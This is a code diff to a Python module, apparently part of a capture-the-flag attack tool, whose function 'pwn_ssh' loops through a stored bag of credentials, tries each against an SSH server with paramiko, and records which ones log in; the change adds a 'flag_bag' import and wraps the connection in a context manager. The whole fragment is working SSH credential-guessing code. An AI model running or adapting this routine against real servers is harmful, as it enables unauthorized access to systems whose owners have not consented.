@@ -2,7 +2,7 @@ from typing import Tuple
 
 import paramiko
 
-from .credentials import credential_bag
+from .credentials import credential_bag, flag_bag
 
 
 def _get_ssh_client():
@@ -17,9 +17,10 @@ def pwn_ssh(url: str, port: int, service) -> Tuple[str, bool, bool]:
     working = set()
     for credential in credential_bag.credentials():
         try:
-            ssh.connect(url, port=port, username=credential.username, password=credential)
-            credential.mark_works(service)
-            working.add(credential)
+            with ssh:
+                ssh.connect(url, port=port, username=credential.username, password=credential)
+                credential.mark_works(service)
+                working.add(credential)
         except:
             credential.mark_rejected(service)
             continue
